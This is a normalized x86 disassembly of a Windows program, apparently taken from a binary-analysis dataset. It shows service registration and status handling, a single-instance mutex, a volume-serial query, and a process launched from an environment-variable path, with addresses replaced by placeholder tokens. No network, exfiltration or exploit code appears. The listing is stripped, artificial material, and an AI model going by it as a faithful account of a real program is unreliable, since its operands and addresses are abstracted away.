call sub_41a0d6
add esp 0x4
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
xor eax eax
mov [ ebp - 0xf8 ] 0x7
mov [ ebp - 0xfc ] ebx
mov [ ebp - 0x10c ] ax
cmp [ ebp - 0xa4 ] esi
jb r-xdata
mov edx [ ebp - 0x10c ]
push edx
call sub_41a0d6
add esp 0x4
sub eax edx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0x2c ]
call sub_403650
lea ecx [ ebp - 0x48 ]
push ecx
lea edx [ ebp - 0x2c ]
push edx
lea eax [ ebp - 0x80 ]
push eax
mov [ ebp - 0x4 ] 0x11
call sub_413870
lea ecx [ ebp - 0x9c ]
push ecx
push eax
lea edx [ ebp - 0x64 ]
push edx
mov [ ebp - 0x4 ] 0x12
call sub_407e00
add esp 0x18
push eax
lea ecx [ edi + 0x24 ]
mov [ ebp - 0x4 ] 0x13
call sub_403a40
mov esi 0x8
cmp [ ebp - 0x50 ] esi
jb r-xdata
xor edx edx
mov [ ebp - 0xa4 ] 0x7
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0xb8 ] dx
cmp [ ebp - 0xdc ] esi
jb r-xdata
mov ecx [ ebp - 0xb8 ]
push ecx
call sub_41a0d6
add esp 0x4
xor ecx ecx
mov [ ebp - 0x50 ] 0x7
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x64 ] cx
cmp [ ebp - 0x6c ] esi
jb r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_41a0d6
add esp 0x4
xor ecx ecx
mov [ ebp - 0xdc ] 0x7
mov [ ebp - 0xe0 ] ebx
mov [ ebp - 0xf0 ] cx
cmp [ ebp - 0x114 ] esi
jb r-xdata
mov eax [ ebp - 0xf0 ]
push eax
call sub_41a0d6
add esp 0x4
xor eax eax
mov [ ebp - 0x6c ] 0x7
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x80 ] ax
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov edx [ ebp - 0x80 ]
push edx
call sub_41a0d6
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn 0x18
mov edx [ ebp - 0x128 ]
push edx
call sub_41a0d6
add esp 0x4
xor edx edx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] dx
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_41a0d6
add esp 0x4
mov eax [ ebp - 0x48 ]
push eax
call sub_41a0d6
add esp 0x4
sub_418c40
push ebp
mov ebp esp
sub esp 0x218
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
xor eax eax
push 0x206
push eax
lea ecx [ ebp - 0x20a ]
push ecx
mov [ ebp - 0x20c ] ax
call sub_41adb0
add esp 0xc
push 0x0
push 0x0
lea edx [ ebp - 0x214 ]
push edx
lea eax [ ebp - 0x218 ]
push eax
lea ecx [ ebp - 0x210 ]
push ecx
push 0x208
lea edx [ ebp - 0x20c ]
push edx
push 0x0
call [ GetVolumeInformationW@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x210 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn
or eax 0xffffffff
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn
sub_418cd0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
push 0x1
push 0x0
mov esi ecx
call [ CreateMutexW@IAT ]
mov [ esi + 0x4 ] eax
call [ GetLastError@IAT ]
cmp eax 0xb7
setne al
pop esi
pop ebp
retn 0x4
sub_418d00
push ebp
mov ebp esp
sub esp 0x60
push esi
push edi
push 0x2
push 0x104
call sub_41acef
add esp 0x8
mov esi eax
mov eax [ ebp + 0x8 ]
push 0x104
push esi
push eax
call [ GetEnvironmentVariableW@IAT ]
xor edi edi
test eax eax
jne r-xdata
mov eax esi
lea edx [ eax + 0x2 ]
push 0x104
push edi
push esi
call sub_41adb0
mov ecx [ ebp + 0xc ]
push ecx
push 0x104
push esi
call sub_41b6cb
add esp 0x18
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
mov edx 0x104
push r--data
sub edx eax
push edx
push esi
call sub_41b656
mov eax esi
add esp 0xc
lea edx [ eax + 0x2 ]
mov edi edi
push 0x44
lea eax [ ebp - 0x60 ]
push edi
push eax
call sub_41adb0
add esp 0xc
xor eax eax
xor ecx ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov [ ebp - 0x30 ] ecx
lea ecx [ ebp - 0x60 ]
push ecx
push edi
push edi
push edi
push 0x1
push edi
push edi
push edi
push esi
mov [ ebp - 0x60 ] 0x44
mov [ ebp - 0x5c ] edi
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x58 ] edi
mov [ ebp - 0x44 ] edi
mov [ ebp - 0x48 ] edi
mov [ ebp - 0x4c ] edi
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x34 ] 0x101
call [ CreateProcessW@IAT ]
test eax eax
je r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
mov ecx [ ebp + 0xc ]
sub eax edx
sar eax 0x1
push ecx
mov edx 0x104
sub edx eax
push edx
push esi
call sub_41b656
add esp 0xc
push 0x3
lea eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0xc ]
mov [ ebp + 0xc ] r--data
call sub_419f0f
push r--data
lea ecx [ ebp - 0xc ]
push ecx
call sub_41ac98
int3
mov edx [ ebp - 0x18 ]
push edx
call [ CloseHandle@IAT ]
push esi
call sub_41a7eb
add esp 0x4
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_418e60
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
cmp eax 0x2
jne r-xdata
mov [ rw-data ] 0x1
cmp eax 0x4
je r-xdata
mov [ rw-data ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push rw-data
push eax
mov [ rw-data ] 0x0
call [ SetServiceStatus@IAT ]
pop ebp
retn
cmp eax 0x1
je r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
inc eax
mov [ rw-data ] eax
mov eax [ rw-data ]
push rw-data
push eax
call [ SetServiceStatus@IAT ]
pop ebp
retn
sub_418ef0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
dec eax
je r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov [ rw-data ] eax
push rw-data
inc eax
push ecx
mov [ rw-data ] 0x3
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
mov [ rw-data ] eax
call [ SetServiceStatus@IAT ]
mov edx [ rw-data ]
push edx
call [ SetEvent@IAT ]
pop ebp
retn 0x4
mov eax [ rw-data ]
push 0x0
push 0x0
push eax
call sub_418e60
add esp 0xc
pop ebp
retn 0x4
sub_418f70
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
xor eax eax
test ecx ecx
je r-xdata
mov eax 0x80070057
cmp ecx 0x7fffffff
jbe r-xdata
pop ebp
retn
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
lea esi [ ecx - 0x1 ]
mov ecx [ ebp + 0x10 ]
lea eax [ ebp + 0x14 ]
push eax
push ecx
push esi
push edi
xor ebx ebx
call sub_41b7ff
add esp 0x10
test eax eax
js r-xdata
test eax eax
js r-xdata
xor eax eax
mov [ edi + esi * 2 ] ax
mov ebx 0x8007007a
cmp eax esi
ja r-xdata
jne r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
xor edx edx
mov [ edi + esi * 2 ] dx
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn
sub_418fe0
push ebx
push esi
xor esi esi
push esi
push esi
mov ebx 0x1
push ebx
push esi
call [ CreateEventW@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] ebx
mov [ rw-data ] esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
push edi
mov edi [ SetServiceStatus@IAT ]
push rw-data
push ecx
mov [ rw-data ] 0x4
call edi
mov edx [ rw-data ]
push 0xffffffff
push edx
call [ WaitForSingleObject@IAT ]
mov eax [ rw-data ]
push rw-data
push eax
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] ebx
mov [ rw-data ] esi
call edi
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
push rw-data
push eax
mov [ rw-data ] ebx
call [ SetServiceStatus@IAT ]
pop esi
pop ebx
retn
sub_419090
push ebp
mov ebp esp
push 0xffffffff
push sub_42f16c
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x2
push 0x400
call sub_41acef
push 0x18
mov ebx eax
call sub_41ac18
add esp 0xc
mov [ ebp - 0xd0 ] eax
xor edi edi
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor esi esi
push 0xb
push rw-data
push 0x10
push rw-data
mov ecx eax
call sub_412430
mov esi eax
jmp r-xdata
push 0x400
push ebx
push eax
call [ GetEnvironmentVariableW@IAT ]
cmp [ ebp - 0xb8 ] 0x8
jb r-xdata
mov eax [ eax ]
lea eax [ ebp - 0xcc ]
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0xffffffff
call sub_412790
cmp [ eax + 0x14 ] 0x8
jb r-xdata
cmp esi edi
je r-xdata
mov ecx [ ebp - 0xcc ]
push ecx
call sub_41a0d6
add esp 0x4
push 0x18
call sub_41ac18
add esp 0x4
mov [ ebp - 0xd0 ] eax
mov [ ebp - 0x4 ] 0x1
cmp eax edi
je r-xdata
mov ecx esi
call sub_412460
push esi
call sub_41a0d6
add esp 0x4
xor esi esi
push 0xb
push rw-data
push 0x14
push rw-data
mov ecx eax
call sub_412430
mov esi eax
jmp r-xdata
push sub_418ef0
push eax
call [ RegisterServiceCtrlHandlerW@IAT ]
cmp [ ebp - 0xb8 ] 0x8
mov [ rw-data ] eax
jb r-xdata
mov eax [ eax ]
lea edx [ ebp - 0xcc ]
push edx
mov ecx esi
mov [ ebp - 0x4 ] 0xffffffff
call sub_412790
cmp [ eax + 0x14 ] 0x8
jb r-xdata
cmp esi edi
je r-xdata
mov eax [ ebp - 0xcc ]
push eax
call sub_41a0d6
add esp 0x4
mov ecx [ rw-data ]
cmp ecx edi
jne r-xdata
mov ecx esi
call sub_412460
push esi
call sub_41a0d6
add esp 0x4
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
inc eax
push ecx
mov [ rw-data ] 0x10
mov [ rw-data ] edi
mov [ rw-data ] 0x2
mov [ rw-data ] edi
mov [ rw-data ] 0xbb8
mov [ rw-data ] edi
mov [ rw-data ] eax
call [ SetServiceStatus@IAT ]
lea edx [ ebp - 0xd4 ]
push edx
push edi
push ebx
push sub_419380
push edi
push edi
mov [ ebp - 0xd4 ] edi
call [ CreateThread@IAT ]
test eax eax
je r-xdata
push rw-data
push edi
call [ RegisterEventSourceW@IAT ]
mov esi eax
cmp esi edi
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_418fe0
add esp 0x8
call [ GetLastError@IAT ]
push eax
push r--data
push r--data
lea ecx [ ebp - 0xb0 ]
push 0x50
push ecx
call sub_418f70
add esp 0x14
push esi
call [ DeregisterEventSource@IAT ]
jmp r-xdata
sub_4192d0
push ebp
mov ebp esp
sub esp 0xb4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xb4 ]
push eax
mov [ ebp - 0xb4 ] rw-data
mov [ ebp - 0xb0 ] sub_419090
mov [ ebp - 0xac ] 0x0
mov [ ebp - 0xa8 ] 0x0
call [ StartServiceCtrlDispatcherW@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
call sub_41ac09
mov esp ebp
pop ebp
retn 0x10
push esi
push rw-data
push eax
call [ RegisterEventSourceW@IAT ]
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn 0x10
call [ GetLastError@IAT ]
push eax
push r--data
push r--data
lea ecx [ ebp - 0xa4 ]
push 0x50
push ecx
call sub_418f70
add esp 0x14
push esi
call [ DeregisterEventSource@IAT ]
sub_419380
push ebp
mov ebp esp
push 0xffffffff
push sub_42f1cc
mov eax [ fs : 0x0 ]
push eax
sub esp 0x7c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x88 ]
call sub_405ee0
xor ebx ebx
push 0x48
mov [ ebp - 0x4 ] ebx
call sub_41ac18
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x1
cmp eax ebx
je r-xdata
mov [ ebp + 0x8 ] ebx
mov ecx eax
call sub_4085f0
mov [ ebp + 0x8 ] eax
jmp r-xdata
xor edi edi
mov ecx eax
call sub_40f550
mov edi eax
jmp r-xdata
push 0x5c
mov [ ebp - 0x4 ] bl
call sub_41ac18
add esp 0x4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x2
cmp eax ebx
je r-xdata
xor esi esi
mov ecx eax
call sub_410ea0
mov esi eax
jmp r-xdata
push 0x4c
mov [ ebp - 0x4 ] bl
call sub_41ac18
add esp 0x4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x3
cmp eax ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x4 ] bl
call sub_403ac0
push edi
lea ecx [ ebp - 0x88 ]
call sub_403ac0
push esi
lea ecx [ ebp - 0x88 ]
call sub_403ac0
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x4 ] 0x4
call sub_404000
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_4061c0
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41949c
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_4061c0
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4194e6
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_419f97
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_41ac98
int3
sub_419533
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_419f97
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_41ac98
int3
sub_419580
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_419ff3
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_41a0d6
pop ecx
sub_4195ac
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x4 ]
call sub_41c203
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
call sub_41c1dd
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov edi 0x100
cmp ebx edi
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
cmp [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] eax
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
pop esi
leave
retn
add eax 0x20
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
mov eax [ ebp - 0x8 ]
and eax 0xff
movsx eax [ ecx + eax * 2 ]
shr eax 0xf
and eax 0x1
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
call sub_41bc90
movzx ecx [ ebp - 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
mov eax [ esi + 0x8 ]
test [ eax + ebx * 2 ] 0x1
je r-xdata
push ebx
call sub_41bd0a
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp + 0xc ] bl
mov [ ebp + 0xd ] 0x0
inc eax
mov al [ ebp - 0x8 ]
push 0x2
mov [ ebp + 0xc ] al
mov [ ebp + 0xd ] bl
mov [ ebp + 0xe ] 0x0
pop eax
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x4 ]
je r-xdata
push 0x1
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
push [ ebp - 0xc ]
push 0x0
call sub_41bc4a
add esp 0x24
test eax eax
jne r-xdata
pop edi
pop ebx
movzx ecx [ ebp - 0x3 ]
shl eax 0x8
or eax ecx
sub_4196b9
mov edi edi
push ebp
mov ebp esp
push esi
call sub_41c203
mov eax [ eax + 0x4 ]
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_41c1dd
push 0x2
push 0x100
mov [ esi + 0x4 ] eax
call sub_41c26e
pop ecx
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
call sub_41bc90
and [ esi + 0xc ] 0x0
mov [ esi + 0x8 ] eax
push 0x200
call sub_41bc90
push eax
push [ esi + 0x8 ]
call sub_41a0f0
add esp 0xc
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn
sub_41972f
mov edi edi
push edi
push rw-data
mov edi ecx
call [ InterlockedIncrement@IAT ]
test eax eax
jne r-xdata
mov eax edi
pop edi
retn
push esi
mov esi rw-data
push esi
call sub_419e72
add esi 0x18
pop ecx
cmp esi rw-data
jl r-xdata
pop esi
sub_419760
push rw-data
call [ InterlockedDecrement@IAT ]
test eax eax
jns r-xdata
retn
push esi
mov esi rw-data
push esi
call sub_419e82
add esi 0x18
pop ecx
cmp esi rw-data
jl r-xdata
pop esi
sub_419789
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] eax
cmp eax 0x4
jge r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
imul eax eax 0x18
add eax rw-data
push eax
call sub_419e92
pop ecx
sub_4197dd
mov edi edi
push ebp
mov ebp esp
push 0x8
call sub_41ac18
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ecx [ rw-data ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov [ rw-data ] eax
pop ebp
retn
sub_419807
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
pop ebp
retn
call sub_409ff0
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_419828
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_419789
push rw-data
call sub_419807
and [ rw-data ] 0x0
pop ecx
lea ecx [ ebp - 0x4 ]
call sub_4197b1
leave
retn
sub_41985a
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
push sub_419828
mov [ rw-data ] 0x1
call sub_419eb2
pop ecx
sub_419884
push 0x4
mov eax sub_42f1f2
call sub_41c393
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_419789
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0xc ]
jmp r-xdata
test esi esi
jne r-xdata
mov eax [ edi + 0x8 ]
dec esi
lea eax [ eax + esi * 4 ]
cmp [ eax ] 0x0
je r-xdata
push [ edi + 0x8 ]
call sub_41a7eb
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x10 ]
call sub_4197b1
call sub_41c3fc
retn
mov ecx [ eax ]
call sub_409ff0
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_4198e4
push 0x4
mov eax sub_42f1f2
call sub_41c393
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_419789
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov esi eax
mov eax [ eax ]
mov ecx esi
mov [ rw-data ] eax
call sub_4197c8
push esi
call sub_41a0d6
pop ecx
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_4197b1
call sub_41c3fc
retn
sub_419932
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
test eax eax
je r-xdata
pop ebp
retn
push eax
push 0x0
call sub_41cf9f
pop ecx
pop ecx
sub_41994d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi ]
push edi
mov edi [ ebp + 0x8 ]
cmp eax edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
test eax eax
je r-xdata
and [ esi ] 0x0
test edi edi
je r-xdata
push eax
call sub_41a7eb
pop ecx
cmp [ edi ] 0x0
mov eax edi
je r-xdata
sub eax edi
push ebx
lea ebx [ eax + 0x1 ]
push ebx
call sub_41ae2a
pop ecx
mov [ esi ] eax
test eax eax
je r-xdata
inc eax
cmp [ eax ] 0x0
jne r-xdata
pop ebx
push ebx
push edi
push eax
call sub_41a0f0
add esp 0xc
sub_4199a5
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
call sub_41cf9f
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
push eax
lea ecx [ esi + 0x14 ]
call sub_41994d
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax r--data
mov eax r--data
push [ ebp + 0xc ]
push 0x0
call sub_41cf9f
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
lea ecx [ esi + 0x1c ]
call sub_41994d
pop esi
pop ebp
retn
sub_4199f2
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov cl [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x14 ] cl
lea ecx [ esi + 0x18 ]
mov [ esi + 0x4 ] 0x1
mov [ esi ] r--data
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
push r--data
mov [ ecx ] eax
mov [ ecx + 0x4 ] al
call sub_41994d
mov eax esi
pop esi
pop ebp
retn 0x4
sub_419a31
push 0x4
mov eax sub_42f220
call sub_41c393
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
push esi
mov [ ebp - 0x4 ] 0x1
call sub_419884
mov eax [ esi + 0x18 ]
pop ecx
test eax eax
je r-xdata
and [ esi + 0x18 ] 0x0
mov [ esi ] r--data
call sub_41c3fc
retn
push eax
call sub_41a7eb
pop ecx
sub_419a74
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_419a31
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_41a0d6
pop ecx
sub_419a95
push 0x4
mov eax sub_42f1f2
call sub_41c393
mov eax [ rw-data ]
xor esi esi
mov edi eax
cmp eax esi
jne r-xdata
mov eax edi
call sub_41c3fc
retn
push esi
lea ecx [ ebp - 0x10 ]
call sub_419789
mov eax [ rw-data ]
mov [ ebp - 0x4 ] esi
mov edi eax
cmp eax esi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_4197b1
push 0x20
call sub_41ac18
pop ecx
cmp eax esi
je r-xdata
push esi
mov edi esi
call sub_41985a
lea ecx [ esi + 0x18 ]
mov [ esi + 0x10 ] 0x3f
mov [ esp ] r--data
call sub_41994d
mov ecx esi
mov [ rw-data ] esi
call sub_409fc0
mov eax [ rw-data ]
mov [ rw-data ] eax
push esi
mov ecx eax
call sub_4199f2
mov esi eax
sub_419b24
mov edi edi
push ebp
mov ebp esp
mov edx [ ecx + 0x4 ]
mov eax [ ebp + 0x8 ]
cmp edx [ eax + 0x4 ]
jne r-xdata
xor eax eax
mov ecx [ ecx ]
cmp ecx [ eax ]
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebp
retn 0x4
sub_419b45
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0xc ]
mov eax [ ecx ]
push [ ebp + 0x8 ]
lea edx [ ebp - 0x8 ]
push edx
call [ eax + 0xc ]
mov ecx eax
call sub_419b24
leave
retn 0x8
sub_419b66
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp ecx [ eax + 0x4 ]
jne r-xdata
xor eax eax
mov eax [ eax ]
cmp eax [ ebp + 0xc ]
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebp
retn 0x8
sub_419ba7
mov edi edi
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_41a0d6
pop ecx
sub_419bc9
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
call sub_41d1d3
pop ecx
mov ecx [ ebp + 0x8 ]
push eax
call sub_407940
mov eax [ ebp + 0x8 ]
leave
retn 0x8
sub_419bec
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0xc ]
call sub_41d1d3
pop ecx
push eax
push r--data
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call sub_407940
mov eax [ ebp + 0x8 ]
leave
retn 0x8
sub_419c1c
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov esi [ edi + 0x2c ]
jmp r-xdata
test esi esi
jne r-xdata
push [ esi + 0x4 ]
push edi
push [ ebp + 0x8 ]
call [ esi + 0x8 ]
mov esi [ esi ]
add esp 0xc
pop edi
pop esi
pop ebp
retn 0x4
sub_419c43
mov edi edi
push esi
push edi
push 0x0
mov esi ecx
call sub_419c1c
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
and [ esi + 0x28 ] 0x0
test eax eax
je r-xdata
mov edi [ eax ]
push eax
call sub_41a0d6
pop ecx
mov eax edi
test edi edi
jne r-xdata
and [ esi + 0x2c ] 0x0
pop edi
pop esi
retn
mov edi [ eax ]
push eax
call sub_41a0d6
pop ecx
mov eax edi
test edi edi
jne r-xdata
sub_419c87
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x8 ] 0x0
jbe r-xdata
mov ecx esi
call sub_419c43
mov esi [ esi + 0x30 ]
test esi esi
je r-xdata
mov eax [ esi + 0x8 ]
lea eax [ eax + rw-data ]
dec [ eax ]
cmp [ eax ] 0x0
jg r-xdata
pop esi
pop ebp
retn
mov ecx esi
call sub_40a040
push esi
call sub_41a0d6
pop ecx
sub_419cc5
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x4 ]
call sub_41c203
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
call sub_41c1dd
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x19
ja r-xdata
cmp [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] eax
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
pop esi
leave
retn
sub eax 0x20
jmp r-xdata
mov ecx [ esi + 0x8 ]
